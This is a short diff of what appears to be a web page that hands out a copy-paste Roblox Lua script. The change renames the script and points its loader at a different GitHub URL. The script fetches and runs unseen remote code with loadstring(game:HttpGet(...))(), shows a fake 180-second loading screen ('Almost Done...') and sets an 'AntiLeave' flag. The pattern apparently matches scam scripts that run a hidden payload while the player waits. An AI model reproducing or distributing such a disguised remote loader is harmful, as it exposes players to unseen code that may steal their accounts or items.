@@ -13,13 +13,13 @@ _G.AntiLeave = true
 _G.MouseLock = true
 -- set them to false if you don't need them
 
-_G.ScriptName = "Rizz Scriptz"
+_G.ScriptName = "Monzz Scriptz"
 _G.FirstText = "Script Preparing"
 _G.SecondText = "Script Loading..."
 _G.ThirdText = "Almost Done..."
 _G.WaitingTime = 180 -- it's the time between 0% and 100% in secondes
 
-loadstring(game:HttpGet("https://rizz69.github.io/Main.lua", true))()`
+loadstring(game:HttpGet("https://raw.githubusercontent.com/psx-sc/MONZ./main/Main.lua", true))()`
 document.addEventListener('DOMContentLoaded', function() {
     document.getElementById('mail').textContent = Mail;
 });
